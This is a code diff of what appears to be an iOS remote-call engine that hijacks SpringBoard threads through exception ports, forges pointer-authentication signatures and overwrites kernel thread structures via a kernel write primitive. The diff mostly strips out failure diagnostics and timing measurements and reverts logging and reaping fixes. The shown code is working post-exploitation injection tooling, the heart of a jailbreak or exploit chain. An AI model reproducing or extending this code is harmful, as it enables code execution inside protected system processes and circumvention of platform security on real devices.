@@ -70,10 +70,6 @@ uint64_t g_RC_gadgetPacia = 0;
 static pthread_mutex_t g_universal_ipc_mutex;
 static pthread_once_t g_universal_ipc_mutex_once = PTHREAD_ONCE_INIT;
 
-// Defined further down, next to the comment that explains what it means.
-// Forward declared because the measurement block below reads it.
-bool remote_call_runs_on_target_main_thread(void);
-
 static void init_universal_mutex(void)
 {
     pthread_mutexattr_t attr;
@@ -97,149 +93,6 @@ void abandon_remote_call_internal(void);
 static __thread RemoteCallInitFailure g_RC_lastInitFailure = RemoteCallInitFailureNone;
 static __thread uint32_t g_RC_lastInitFailurePid = 0;
 
-// Which of the two waits in do_remote_call_temp_internal gave up on its last call:
-// 1 is the first, waiting for the thread to be parked at a faulting PC, 2 is the
-// second, waiting for it to come back from the function. 0 is neither, so the call
-// failed somewhere else, in sign_state or in a rejected state.
-//
-// The init failure string for the bootstrap getpid used to guess between the two
-// in prose, "0x101 miss / 0x201?", which is a hypothesis dressed as a diagnosis
-// and is the only thing the app's own console had to say about a failure that
-// decides whether the entire overlay exists. This is the measurement behind it.
-// Which step of a temp call gave up on its last call.
-//
-//   1  the first wait, for the thread to be parked at a faulting PC
-//   2  the second wait, for it to come back from the function
-//   3  both waits completed, and the state that arrived was rejected as not live
-//      enough to reply onto
-//   4  both waits completed, and sign_state failed, which is remote_pac returning
-//      0, which is the pacia signer not producing a result in time
-//
-// Values 3 and 4 were one bucket until the app console was asked to tell them
-// apart and answered "state rejected or sign_state failed", which is the answer you
-// get when the question had two halves and only one was asked. It had two halves
-// because the PAC signer's internal wait and the target's exception wait are
-// governed by completely different numbers, and the signer was the wrong one.
-static __thread int g_RC_lastTempStep = 0;
-// The one call that is allowed through the session gate even though the session has
-// already failed: the pthread_exit that takes the synthetic call thread down during
-// teardown. It is set only around that call. See destroy_remote_call_internal.
-static bool g_RC_teardownCall = false;
-// How many times the bootstrap getpid was tried before the init gave up. Zero for
-// any other failure. Only exists so the failure can say how hard it tried.
-static __thread int g_RC_bootstrapAttempts = 0;
-// How many times the pacia signer produced nothing in time on this thread. Counted
-// rather than merely recorded, because "the signer timed out once" and "the signer
-// timed out on every attempt" are different bugs and only the count tells them
-// apart. Read by remote_call_last_init_failure_detail.
-__thread int g_RC_pacWaitTimeouts = 0;
-__thread uint64_t g_RC_bootstrapPid = 0;
-// Which branch of the synthetic call thread construction gave up.
-//
-//   1  pthread_create_suspended_np itself failed, or the call to it did
-//   2  the create succeeded and no thread appeared in the thread list diff
-//   3  a thread appeared but its address is not a kernel address
-//   4  the thread is there and valid, and SpringBoard's own ipc_space holds no
-//      port name for it, which the file already records as normal
-//   5  the out pointer came back empty or as the canary, and no thread appeared
-//   6  pthread_mach_thread_np failed
-//   7  that gave a port, and resolving it to a kobject gave something that is not
-//      a kernel address
-//   8  no port at all, and there is no inject thread[1] to fall back to
-//   9  no port at all, and thread[1] is invalid or is the signing thread itself
-//  10  no target buffer to write the pthread_t into
-//  11  the create was sent and did not come back from where a return comes from
-//  12  the signature for the start routine could not be produced
-//  13  the callee's symbol did not resolve, so the call was not sent at all
-//  15  the reused thread's park could not be signed
-//  16  the TRO-swap sequence that parks the reused thread failed
-//
-// Without this, "synthetic call thread kobject invalid" is one sentence for nine
-// different failures, four of which are documented in this file as expected on some
-// paths, and the console has no way to tell them apart. Read by
-// remote_call_last_init_failure_detail.
-// Set when the fresh-create path cannot be completed, so the thread[1] reuse below
-// gets its turn instead of the session being destroyed.
-//
-// A create is an optimisation. It yields a brand new thread, which is the safest
-// thing to hijack, so it stays first. But it is a call into another process's
-// libsystem_pthreads with a caller-supplied out pointer, it has faulted
-// deterministically, and every one of the ways it can fail used to end the whole
-// session. SpringBoard has threads of its own a few entries down the list from the
-// one being hijacked, this file already has a path that parks one of those at the
-// same fake program counter behind the same exception port, and a working fallback
-// is worth more than a create that dies.
-//
-// A flag rather than a goto, because the create block declares things that are still
-// in scope after it and a jump into their initialisation is the kind of thing that
-// compiles and then does something else.
-// x8 for the next call: the arm64 INDIRECT_RESULT register.
-//
-// When a function returns a struct wider than 16 bytes, the caller passes the
-// address to write the struct into in x8, and the callee returns nothing. That
-// is not an argument and not a result, so it does not belong in the x0..x7
-// signature, and every call site in this file passes nothing for it.
-//
-// The 2026-09-30 17:43 device log is what it looks like when x8 holds a stale
-// value. Three objc_msgSend calls in a row faulted with
-// codeSecond = 0x200075cfd74ed0 and 0x200075cf92ecb0, PC inside objc_msgSend,
-// and x0 heap shaped rather than scalar. The runtime wrote the returned struct
-// to whatever x8 said, that address was not mapped, and the write faulted. The
-// selectors that hit this are -bounds on a label (CGRect, 16 bytes) and -bounds
-// on UIScreen (CGRect, 32 bytes); both are over the 16 byte limit that decides
-// whether a return fits in x0 and x1.
-//
-// Zero means no struct return, which is every call that does not opt in, so
-// the default path is unchanged.
-uint64_t g_RC_indirectResultPtr = 0;
-void remote_call_set_indirect_result_ptr(uint64_t p) { g_RC_indirectResultPtr = p; }
-
-static bool g_RC_createDead = false;
-// Which path produced the call thread, for the failure report. "create", "reuse1" or
-// empty, and empty means neither happened.
-static const char *g_RC_callThreadPath = "";
-
-// The definition of g_RC_callThreadStep, which the header declares extern because
-// PAC.m increments it.
-//
-// It was lost, and the loss was invisible to every check in this repo. The line was
-// replaced wholesale when the create-side flag went in above, so what remained was an
-// extern declaration, a use, and no definition. That compiles perfectly under
-// -fsyntax-only, which is all synall.sh and synapp.sh do, and only the linker sees it:
-//
-//   Undefined symbols for architecture arm64:
-//     "_g_RC_callThreadStep", referenced from:
-//       _remote_call_last_init_failure_detail in RemoteCall.m.435c9f27.o
-//
-// So a declaration and its definition are now checked against each other, which is
-// the class of mistake no compile-only check can catch. See synapp.sh.
-__thread int g_RC_callThreadStep = 0;
-// The PC of whatever arrived on the port second, i.e. where the thread was when the
-// call's "return" was delivered. A return is always the fake link register. Anything
-// else is a fault raised inside the function, and its x0 is a register the function
-// never set, which is a return value that means nothing.
-//
-// The raw value is kept as well as the stripped one because the whole point of the
-// stripped one is the comparison, and a comparison that cannot be explained from the
-// outside is not much of a measurement. Read by remote_call_last_init_failure_detail.
-__thread uint64_t g_RC_lastTempRetPC = 0;
-__thread uint64_t g_RC_lastTempRetPC_raw = 0;
-// The type and code of whatever arrived on the port second, and x0 as it stood at
-// the fault. A PC on its own says the thread was somewhere; these say what happened
-// to it there, which is the difference between four bugs behind one line:
-//
-//   EXC_BAD_ACCESS read     the call was handed an address it cannot read
-//   EXC_BAD_ACCESS write    the call was handed an address it cannot write
-//   EXC_BAD_ACCESS execute  the thread jumped where it may not execute, which is
-//                           what a signature that does not authenticate looks like
-//   EXC_BAD_INSTRUCTION     an illegal instruction, which with authenticated
-//                           pointers is a PAC failure and essentially nothing else
-//   EXC_GUARD               not a fault at all: a thread guard tripping, so the
-//                           port caught something that is not the call
-__thread uint32_t g_RC_lastTempExcType = 0;
-__thread uint64_t g_RC_lastTempExcCode = 0;
-__thread uint64_t g_RC_lastTempX0 = 0;
-
 typedef struct RemoteCallState {
     uint64_t taskAddr;
     bool creatingExtraThread;
@@ -257,7 +110,6 @@ typedef struct RemoteCallState {
     uint64_t vmMap;
     uint64_t callThreadAddr;
     uint64_t trojanThreadAddr;
-    uint64_t mainThreadAddr;
     int pid;
     bool success;
     NSMutableArray<NSNumber *> *threadList;
@@ -314,7 +166,6 @@ static void remote_call_pop_state(RemoteCallState *previous)
 #define g_RC_vmMap                 (remote_call_current_state()->vmMap)
 #define g_RC_callThreadAddr        (remote_call_current_state()->callThreadAddr)
 #define g_RC_trojanThreadAddr      (remote_call_current_state()->trojanThreadAddr)
-#define g_RC_mainThreadAddr        (remote_call_current_state()->mainThreadAddr)
 #define g_RC_pid                   (remote_call_current_state()->pid)
 #define g_RC_success               (remote_call_current_state()->success)
 #define g_RC_threadList            (remote_call_current_state()->threadList)
@@ -356,148 +207,14 @@ const char *remote_call_init_failure_description(RemoteCallInitFailure failure)
         case RemoteCallInitFailureLocalThread: return "local bootstrap thread setup failed";
         case RemoteCallInitFailureNoTargetThreads: return "no injectable target threads";
         case RemoteCallInitFailureFirstExceptionTimeout: return "target did not deliver bootstrap exception";
-        // The two guesses that used to live here, "0x101 miss / 0x201?", were a
-        // hypothesis with no measurement behind it, and they were the only thing the
-        // app's console could say about a failure that decides whether the entire
-        // overlay exists. The measurement is remote_call_last_init_failure_detail.
-        case RemoteCallInitFailureBootstrapGetpid: return "bootstrap getpid failed";
+        case RemoteCallInitFailureBootstrapGetpid: return "bootstrap getpid failed (0x101 miss / 0x201?)";
         case RemoteCallInitFailurePthreadCreate: return "pthread_create_suspended_np / mach_thread failed";
         case RemoteCallInitFailureCallThread: return "synthetic call thread kobject invalid";
         case RemoteCallInitFailureThreadResume: return "thread_resume synthetic failed";
-        case RemoteCallInitFailureFirstStableCall: return "first call on the call thread failed";
         case RemoteCallInitFailureRestoreOriginal: return "restore original after pthread failed";
         case RemoteCallInitFailureOther: return "other RemoteCall init failure";
     }
     return "unknown RemoteCall init failure";
-}
-
-// What actually happened, for the failures that have more than one way to happen.
-//
-// The app's console is the only place a person can read any of this, and it prints
-// remote_call_init_failure_description and nothing else. That string is a pure
-// function of the enum, so for a failure with a fork in it the fork was invisible
-// and the string carried a guess instead.
-//
-// Built on demand into a thread-local buffer, from thread-local state, so there is
-// nothing to keep in step at the point of failure. Callers print it; nothing logs
-// it, because a caller that cannot print it has nowhere to put it.
-// A fault in words, from the type and code the exception message already carries.
-//
-// The ARM_THREAD_STATE64 flavor has no fault address in it, so the address is not
-// available and is not invented here. The type and the code are, and between them
-// they name the fault: a bad access says whether the thread was reading, writing or
-// executing, an illegal instruction means a signature did not authenticate, and a
-// thread guard means the port caught something that is not a fault at all.
-static const char *rc_exc_kind(char *buf, size_t n)
-{
-    if (g_RC_lastTempExcType == 0x241 || g_RC_lastTempExcType == 0x242) {
-        snprintf(buf, n, "EXC_GUARD");
-    } else if (g_RC_lastTempExcType == 2) {           // EXC_BAD_ACCESS
-        const unsigned kind = (unsigned)(g_RC_lastTempExcCode & 0xff);
-        const char *what = (kind == 1) ? "read" : (kind == 2) ? "write"
-                        : (kind == 3) ? "execute" : "unknown";
-        snprintf(buf, n, "EXC_BAD_ACCESS.%s code=0x%llx", what,
-                 (unsigned long long)g_RC_lastTempExcCode);
-    } else if (g_RC_lastTempExcType == 6) {           // EXC_BAD_INSTRUCTION
-        snprintf(buf, n, "EXC_BAD_INSTRUCTION(pac) code=0x%llx",
-                 (unsigned long long)g_RC_lastTempExcCode);
-    } else if (g_RC_lastTempExcType == 1) {           // EXC_SOFTWARE
-        snprintf(buf, n, "EXC_SOFTWARE code=0x%llx",
-                 (unsigned long long)g_RC_lastTempExcCode);
-    } else {
-        snprintf(buf, n, "exc=%u code=0x%llx", g_RC_lastTempExcType,
-                 (unsigned long long)g_RC_lastTempExcCode);
-    }
-    return buf;
-}
-
-const char *remote_call_last_init_failure_detail(void)
-{
-    static __thread char detail[224];
-    static __thread char kind[64];
-    if (g_RC_lastInitFailure == RemoteCallInitFailureBootstrapGetpid) {
-        const char *step;
-        switch (g_RC_lastTempStep) {
-            // The thread was parked at a faulting PC by the creator reply and the trap
-            // never arrived, or never arrived in time.
-            case 1:  step = "wait1 no trap (thread never reached 0x101)"; break;
-            // It ran, and the fault from returning into the fake link register never came
-            // back, so the return value was never delivered.
-            case 2:  step = "wait2 no return (RET to 0x201 never trapped)"; break;
-            // Both waits completed, so the trap and the return both arrived, and the
-            // state was refused because it was not live enough to reply onto.
-            case 3:  step = "state rejected (not live enough to reply onto)"; break;
-            // Both waits completed and the state was fine, and signing the pointer the
-            // thread is about to run at did not produce a signature. This is the pacia
-            // signer's own wait, inside remote_pac, and it is counted.
-            case 4:  step = "sign_state failed (pacia signer returned nothing)"; break;
-            // Both waits completed but wait2 PC was not FAKE_LR - a fault inside the
-            // callee. Marked so bootstrap cannot treat it as a green light.
-            case 5:  step = "wait2 fault (PC was not FAKE_LR 0x201)"; break;
-            default: step = "both waits completed (no step recorded)"; break;
-        }
-        snprintf(detail, sizeof(detail), "attempts=%d last=%s pacTimeouts=%d pid=%llu",
-                 g_RC_bootstrapAttempts, step, g_RC_pacWaitTimeouts,
-                 (unsigned long long)g_RC_bootstrapPid);
-        return detail;
-    }
-
-    if (g_RC_lastInitFailure == RemoteCallInitFailureCallThread) {
-        const char *step;
-        switch (g_RC_callThreadStep) {
-            case 1:  step = "pthread_create_suspended_np failed"; break;
-            case 2:  step = "create ok, no new thread in list diff"; break;
-            case 3:  step = "new thread addr not a kernel address"; break;
-            case 4:  step = "no port name for the new thread in SB ipc_space"; break;
-            case 5:  step = "out pointer empty or canary, and no new thread"; break;
-            case 6:  step = "pthread_mach_thread_np failed"; break;
-            case 7:  step = "port resolved to a non-kernel kobject"; break;
-            case 8:  step = "no port and no inject thread[1] to reuse"; break;
-            case 9:  step = "thread[1] invalid or is the signing thread"; break;
-            case 10: step = "no target buffer for the out pointer"; break;
-            case 11: step = "create faulted instead of returning"; break;
-            default: step = "unclassified"; break;
-        }
-        snprintf(detail, sizeof(detail),
-                 "callThread=%s path=%s retPC=0x%llx want=0x%llx %s x0=0x%llx",
-                 step, g_RC_callThreadPath[0] ? g_RC_callThreadPath : "-",
-                 (unsigned long long)g_RC_lastTempRetPC,
-                 (unsigned long long)FAKE_LR_TROJAN_CREATOR,
-                 rc_exc_kind(kind, sizeof(kind)),
-                 (unsigned long long)g_RC_lastTempX0);
-        return detail;
-    }
-
-    if (g_RC_lastInitFailure == RemoteCallInitFailurePthreadCreate) {
-        const char *step;
-        switch (g_RC_callThreadStep) {
-            case 10: step = "no target buffer for the out pointer"; break;
-            case 11: step = "create faulted instead of returning"; break;
-            case 12: step = "start routine signature (remote_pac 0x301) failed"; break;
-            case 13: step = "callee symbol did not resolve, call refused"; break;
-            case 14: step = "could not park the fresh call thread"; break;
-            case 15: step = "could not sign the reused thread's park"; break;
-            case 16: step = "TRO-swap park of the reused thread failed"; break;
-            case 19: step = "stable sign_state failed, no reply sent"; break;
-            case 20: step = "stable wait1 gave up (no park trap)"; break;
-            case 21: step = "stable wait2 gave up (never came back)"; break;
-            case 22: step = "stable wait1 got a fault, not the call thread's park"; break;
-            case 23: step = "stable callee faulted; x0 is a register, not a result"; break;
-            case 24: step = "temp callee faulted; x0 is a register, not a result"; break;
-            case 25: step = "call refused, session already failed; port untouched"; break;
-            default: step = "unclassified"; break;
-        }
-        snprintf(detail, sizeof(detail),
-                 "callThread=%s path=%s retPC=0x%llx want=0x%llx %s x0=0x%llx",
-                 step, g_RC_callThreadPath[0] ? g_RC_callThreadPath : "-",
-                 (unsigned long long)g_RC_lastTempRetPC,
-                 (unsigned long long)FAKE_LR_TROJAN_CREATOR,
-                 rc_exc_kind(kind, sizeof(kind)),
-                 (unsigned long long)g_RC_lastTempX0);
-        return detail;
-    }
-
-    return "";
 }
 
 static bool remote_call_verbose_logging(void)
@@ -506,230 +223,12 @@ static bool remote_call_verbose_logging(void)
     return env && env[0] && strcmp(env, "0") != 0;
 }
 
-// Monotonic microseconds for the RC_DIAG rate limiter. clock_gettime rather
-// than mach_absolute_time, because the latter counts ticks and a one-second
-// window built on ticks is a window of arbitrary length.
-static uint64_t remote_call_diag_now_us(void)
-{
-    struct timespec ts;
-    clock_gettime(CLOCK_MONOTONIC, &ts);
-    return (uint64_t)ts.tv_sec * 1000000ULL + (uint64_t)ts.tv_nsec / 1000ULL;
-}
-
-// Measurement for the SpringBoard main-thread watchdog kill. Nothing here
-// changes behaviour: it is two clock reads around a lock that is already
-// taken, and a few counters.
-//
-// The device report for that kill says:
-//     unresponsive dispatch queue(s): com.apple.main-thread
-//     60 seconds since last successful checkin
-//     thread 1562: turnstile blocked on task pid 850, hops: 2
-// pid 850 is this app. A turnstile belongs to whoever owns the memory the
-// mutex lives in, so "blocked on task pid 850" means a SpringBoard thread is
-// waiting on a pthread mutex that lives in our address space. The only code
-// of ours that a SpringBoard thread can reach is the code the hijack makes it
-// execute, and the only lock on that path is g_universal_ipc_mutex.
-//
-// Two numbers distinguish the two candidate stories. holdMax is how long the
-// target thread is kept inside our code by one call: if the trojan thread is
-// the main thread, that is the main thread being held, and watchdogd kills at
-// 60s of no checkin. waitMax is how long a thread of ours sat blocked on the
-// same mutex, which is the turnstile in the report: a wait that grows without
-// bound is the deadlock, a wait that stays flat is only queueing.
-static uint64_t g_rcIpcCalls = 0;
-static uint64_t g_rcIpcHoldMaxUS = 0;
-static uint64_t g_rcIpcHoldTotalUS = 0;
-static uint64_t g_rcIpcWaitMaxUS = 0;
-static uint64_t g_rcIpcWaitSlow = 0;      // waits of 1ms or more
-static uint32_t g_rcIpcLastHolderTid = 0;
-static uint32_t g_rcIpcLastWaiterTid = 0;
-
-// Which call hangs, and for how long. The measured shape of the freeze is one
-// call that holds the mutex until the stable-exception timeout, which is
-// g_RC_stableExceptionTimeoutFloorMS = 10000ms, and holdmax landing on 10063ms
-// is that timeout, not a coincidence. Which symbol is stuck is what says
-// whether the hang is in the path build, in the path draw, or in the
-// housekeeping around them, and those three have nothing in common.
-//
-// 500ms is the threshold because a healthy call is under 10ms here, so a half
-// second is already two orders of magnitude out and cannot fire on noise. Only
-// the slowest name is kept, because a flood of names is not the question: the
-// question is which one call can sit there for ten seconds.
-#define RC_SLOW_CALL_US 500000ULL
-#define RC_SLOW_NAME_MAX 64
-static char g_rcSlowName[RC_SLOW_NAME_MAX] = {0};
-static uint64_t g_rcSlowMaxUS = 0;
-static uint64_t g_rcSlowCount = 0;
-static uint32_t g_rcSlowTid = 0;
-
-static inline uint32_t rc_ipc_tid(void)
-{
-    return (uint32_t)pthread_mach_thread_np(pthread_self());
-}
-
-static inline uint64_t rc_ipc_lock_measuring(uint64_t *waitOut)
-{
-    const uint64_t t0 = remote_call_diag_now_us();
-    pthread_mutex_lock(&g_universal_ipc_mutex);
-    const uint64_t t1 = remote_call_diag_now_us();
-    const uint64_t waited = t1 - t0;
-    *waitOut = waited;
-    if (waited > g_rcIpcWaitMaxUS) {
-        g_rcIpcWaitMaxUS = waited;
-        g_rcIpcLastWaiterTid = rc_ipc_tid();
-    }
-    if (waited >= 1000ULL) g_rcIpcWaitSlow++;
-    return t1;
-}
-
-static inline void rc_ipc_unlock_measuring(uint64_t t1, const char *name)
-{
-    const uint64_t held = remote_call_diag_now_us() - t1;
-    g_rcIpcCalls++;
-    g_rcIpcHoldTotalUS += held;
-    if (held > g_rcIpcHoldMaxUS) g_rcIpcHoldMaxUS = held;
-    g_rcIpcLastHolderTid = rc_ipc_tid();
-    if (held >= RC_SLOW_CALL_US) {
-        g_rcSlowCount++;
-        if (held > g_rcSlowMaxUS) g_rcSlowMaxUS = held;
-        g_rcSlowTid = g_rcIpcLastHolderTid;
-        if (name) {
-            strncpy(g_rcSlowName, name, RC_SLOW_NAME_MAX - 1);
-            g_rcSlowName[RC_SLOW_NAME_MAX - 1] = '\0';
-        } else {
-            g_rcSlowName[0] = '\0';
-        }
-        // Logged at the moment it happens, not only in the heartbeat: the hang
-        // is what kills the session, and a session that is dying may never
-        // reach another heartbeat line.
-        NSLog(@"[RC-SLOW] call=%s held=%llums tid=%u slowcount=%llu",
-              name ?: "(null)", (unsigned long long)(held / 1000ULL),
-              (unsigned)g_rcIpcLastHolderTid, (unsigned long long)g_rcSlowCount);
-    }
-    pthread_mutex_unlock(&g_universal_ipc_mutex);
-}
-
-const char *remote_call_slowest_call_name(void)
-{
-    return g_rcSlowName[0] ? g_rcSlowName : "(none)";
-}
-
-// Which of the two waits ate the time.
-//
-// A call parks a synthetic thread in an exception, hands it the function to
-// run, then waits for the thread to come back with the result. That is two
-// waits, and a 10 second hold is one of them hitting newTimeout, which is
-// g_RC_stableExceptionTimeoutFloorMS. The symbol is not the cause of the wait:
-// the device log shows objc_msgSend and malloc both holding for ten seconds,
-// and malloc never touches objc or a main thread, so what is common to them is
-// the transport, not the callee.
-//
-// wait1 timing out means the thread never picked up the call at all: the
-// session is dead before any work is done. wait2 timing out means it took the
-// call and never came back, which is a wedged or descheduled thread. Those
-// two have different fixes, so which one it is has to be measured rather than
-// guessed from the symbol name.
-static uint64_t g_rcWait1US = 0;
-static uint64_t g_rcWait2US = 0;
-static uint64_t g_rcWait1TO = 0;
-static uint64_t g_rcWait2TO = 0;
-static uint64_t g_rcWait1MaxUS = 0;
-static uint64_t g_rcWait2MaxUS = 0;
-// 0 = no wait2 timeout yet, 1 = init released its borrowed threads,
-// 2 = it did not.
-static int g_rcW2Stray = 0;
-// Identity of the thread that was replied to. Reported on a wait2 timeout so
-// the thread that took the work is named even though the one that faulted is
-// not reachable from here.
-static uint32_t g_rcW1Sender = 0;
-static uint64_t g_rcW1Pc = 0;
-// How many threads init borrowed, gave back, and kept as the call thread. The
-// release is the fix, so its result has to be visible: a timeout with
-// released=0 means the fix did not take rather than that something else broke.
-static uint64_t g_rcBorrowedTotal = 0;
-static uint64_t g_rcBorrowedReleased = 0;
-static uint64_t g_rcBorrowedKept = 0;
-
-void remote_call_wait_split_diag(uint64_t *wait1US, uint64_t *wait2US,
-                                 uint64_t *wait1TO, uint64_t *wait2TO,
-                                 uint64_t *wait1MaxUS, uint64_t *wait2MaxUS,
-                                 int *w2stray, uint32_t *w1sender, uint64_t *w1pc,
-                                 uint64_t *borrowed, uint64_t *released,
-                                 uint64_t *kept)
-{
-    if (wait1US)    *wait1US = g_rcWait1US;
-    if (wait2US)    *wait2US = g_rcWait2US;
-    if (wait1TO)    *wait1TO = g_rcWait1TO;
-    if (wait2TO)    *wait2TO = g_rcWait2TO;
-    if (wait1MaxUS) *wait1MaxUS = g_rcWait1MaxUS;
-    if (wait2MaxUS) *wait2MaxUS = g_rcWait2MaxUS;
-    if (w2stray)    *w2stray = g_rcW2Stray;
-    if (w1sender)   *w1sender = g_rcW1Sender;
-    if (w1pc)       *w1pc = g_rcW1Pc;
-    if (borrowed)   *borrowed = g_rcBorrowedTotal;
-    if (released)   *released = g_rcBorrowedReleased;
-    if (kept)       *kept = g_rcBorrowedKept;
-}
-
-void remote_call_slowest_call(uint64_t *maxUS, uint64_t *count, uint32_t *tid)
-{
-    if (maxUS) *maxUS = g_rcSlowMaxUS;
-    if (count) *count = g_rcSlowCount;
-    if (tid)   *tid = g_rcSlowTid;
-}
-
-void remote_call_main_thread_diag(uint64_t *onMain, uint64_t *holdMaxUS,
-                                 uint64_t *holdTotalUS, uint64_t *waitMaxUS,
-                                 uint64_t *waitSlow, uint64_t *calls,
-                                 uint32_t *lastHolderTid, uint32_t *lastWaiterTid)
-{
-    if (onMain)        *onMain = remote_call_runs_on_target_main_thread() ? 1 : 0;
-    if (holdMaxUS)     *holdMaxUS = g_rcIpcHoldMaxUS;
-    if (holdTotalUS)   *holdTotalUS = g_rcIpcHoldTotalUS;
-    if (waitMaxUS)     *waitMaxUS = g_rcIpcWaitMaxUS;
-    if (waitSlow)      *waitSlow = g_rcIpcWaitSlow;
-    if (calls)         *calls = g_rcIpcCalls;
-    if (lastHolderTid) *lastHolderTid = g_rcIpcLastHolderTid;
-    if (lastWaiterTid) *lastWaiterTid = g_rcIpcLastWaiterTid;
-}
-
 #define RC_DEBUG(...) do { if (remote_call_verbose_logging()) printf(__VA_ARGS__); } while (0)
-//
 // 3uTools Realtime Log catches NSLog; plain printf is often invisible there.
-//
-// Rate limited to one line per second, and that is the whole point of the
-// macro. Four RC_DIAG fire on the success path of every single remote call
-// (RemoteCall.m:1209, 1216, 1256, 1267), and they fire from inside
-// do_remote_call_stable_addr_internal, which means they fire while
-// g_universal_ipc_mutex and gRemoteCallLock are both held. An NSLog is an
-// os_log IPC to logd, so one publish of fifty calls was two hundred logd
-// round trips, each one inside the lock that every other call is queued behind.
-//
-// That is the measured shape of the freeze. A remote call costs about
-// 0.25 ms when logd is keeping up and 4.4 ms when it is not, with no change
-// in the work between them, and a realtime log consumer attached is exactly
-// what makes the slow case the common one. Fifty calls at 4.4 ms is 220 ms,
-// which is the 218 ms publish the device log recorded.
-//
-// RC_VERBOSE=1 restores every line, so nothing is lost for a deliberate
-// capture. The default is one line a second, which is the rate everything
-// else in this project already logs at and is enough to see that a session
-// is alive or that a specific call keeps failing.
 #define RC_DIAG(fmt, ...) do { \
-        if (remote_call_verbose_logging()) { \
-            char _rc_diag_buf[1024]; \
-            snprintf(_rc_diag_buf, sizeof(_rc_diag_buf), "[RemoteCall] DIAG " fmt, ##__VA_ARGS__); \
-            NSLog(@"%s", _rc_diag_buf); \
-        } else { \
-            static uint64_t _rc_diag_last = 0; \
-            uint64_t _rc_diag_now = remote_call_diag_now_us(); \
-            if (_rc_diag_last == 0 || _rc_diag_now - _rc_diag_last >= 1000000ULL) { \
-                _rc_diag_last = _rc_diag_now; \
-                char _rc_diag_buf[1024]; \
-                snprintf(_rc_diag_buf, sizeof(_rc_diag_buf), "[RemoteCall] DIAG " fmt, ##__VA_ARGS__); \
-                NSLog(@"%s", _rc_diag_buf); \
-            } \
-        } \
+        char _rc_diag_buf[1024]; \
+        snprintf(_rc_diag_buf, sizeof(_rc_diag_buf), "[RemoteCall] DIAG " fmt, ##__VA_ARGS__); \
+        NSLog(@"%s", _rc_diag_buf); \
     } while (0)
 
 static bool remote_call_should_log_result(const char *name, bool stable)
@@ -1058,32 +557,11 @@ static uint32_t reap_dead_port_names(const char *reason)
     return dead;
 }
 
-// Time based, not call based.
-//
-// This used to be "every 64th sign_state", and a call count is the wrong shape
-// for a cost that is paid once per period. The overlay drives the call rate, so
-// every-64th-calls meant the whole-task mach_port_names sweep ran three or four
-// times a second at a healthy publish rate and proportionally more when a
-// publish got slow, which is exactly the wrong direction: the enumeration runs
-// inside g_universal_ipc_mutex and gRemoteCallLock, so it lands on top of every
-// other call that is queued behind it.
-//
-// Once a second bounds it independently of how fast the overlay is running, and
-// still keeps a hard ceiling on how long a dead port name can sit in the task's
-// ipc space.
-//
-// A reap is not load bearing for correctness across sessions, either. Both
-// teardown paths already reap unconditionally (abandon_remote_call_internal and
-// destroy_remote_call_internal), and get_shmem_for_page reaps reactively when a
-// page will not map. What this one covers is a long-lived session that never
-// tears down, which is the only case that needs a periodic pass.
 static void reap_dead_port_names_if_needed(const char *reason)
 {
-    static volatile uint64_t s_lastReap = 0;
-    const uint64_t now = remote_call_diag_now_us();
-    const uint64_t last = __sync_add_and_fetch(&s_lastReap, 0);
-    if (last != 0 && now - last < 1000000ULL) return;
-    __sync_lock_test_and_set(&s_lastReap, now);
+    static volatile uint32_t signCount = 0;
+    uint32_t count = __sync_add_and_fetch(&signCount, 1);
+    if ((count & 0x3f) != 0) return;
     (void)reap_dead_port_names(reason);
 }
 
@@ -1150,11 +628,8 @@ bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread
         return false;
     }
 
-    // The diversifier is read for the record. It is not applied to the state
-    // below because thread_set_exception_ports and pthread_exit are reached with
-    // a PC that carries no diversifier, so keeping it would only add a warning
-    // about a value nothing consumes.
-    (void)((uint64_t)state.__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK);
+    uint64_t diver = 0;
+    diver = (uint64_t)state.__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
 
     arm_thread_state64_set_pc_fptr(state, thread_set_exception_ports_addr);
     arm_thread_state64_set_lr_fptr(state, pthread_exit_addr);
@@ -1416,120 +891,13 @@ static bool tro_swap_thread_op(uint64_t targetThread,
 
 // Park remote thread at FAKE_PC/LR with no target-task port:
 // suspend → set_state(park) → resume (faults into secondExceptionPort).
-// park_remote_thread_via_tro_swap installs a state into a target thread through a
-// borrowed TRO, suspending, setting and resuming it in one balanced sequence.
-//
-// IT CANNOT DO THAT, and it is no longer asked to pretend it can.
-//
-// tro_swap_thread_op works like this, and reading it is the whole of the finding: it
-// creates a LOCAL helper thread running fn, resumes it, then finds the helper's kernel
-// stack, locates the helper's thread_resume_operation, verifies the target thread
-// belongs to the target task, and kwrites the TARGET thread's TRO over the helper's.
-// So when the kernel resumes that slot, the thread that actually runs is the target
-// thread, continuing in the middle of fn.
-//
-// fn here is thread_set_state, and the thread that runs it is a SpringBoard thread.
-// Its arguments are x0, x1, x2, x3, and x2 is the state buffer. The buffer is malloc'd
-// in THIS process, so the address is a user address of this app. That address is not
-// mapped in SpringBoard. The target thread therefore dereferences an unmapped address
-// while inside thread_set_state, writes nothing, and the state is never installed —
-// and the function reports success, because all it checks is that the TRO swap
-// happened.
-//
-// That is not a new observation. It is what this file already recorded and did not
-// connect: "thread_set_state returned kr=0 while the resumed thread still ran getpid
-// with sp=0" is a set_state that did not set anything.
-//
-// So the reuse path has been reporting a park that never happened for its whole life,
-// and every failure after it has been read as a fault in whatever came next. Making
-// the state buffer live in the target needs a target-side write for 42 bytes, and
-// this engine has no primitive for that: remote_write is the aliasing path the file
-// distrusts, and a remote memcpy needs a target source. Until there is one, the honest
-// thing is for this to say no in one line instead of succeeding and costing a round.
-// Park a target thread at FAKE_PC/LR without a usable SB-side mach port right
-// in this task. Same mechanism as the creator trap: inject EXC_GUARD, catch on
-// the already-installed secondExceptionPort, reply a signed park state.
-//
-// The old TRO-swap path ran thread_set_state inside SpringBoard with a state
-// buffer allocated here — that address is unmapped in SB, so set_state wrote
-// nothing while reporting success (e268f92: "parked" then stable/getpid hang,
-// SB EXC_BAD_ACCESS at the hijacked SP). Do not bring that back.
-static bool park_remote_thread_via_exc_guard(uint64_t targetThread,
-                                             const arm_thread_state64_internal *stateToInstall,
-                                             bool useMigFilterBypass)
-{
-    (void)useMigFilterBypass;
-    if (!is_kaddr_valid(targetThread) || !stateToInstall) {
-        RC_DIAG("EXC_GUARD park: bad args thread=0x%llx state=%p",
-                (unsigned long long)targetThread, stateToInstall);
-        return false;
-    }
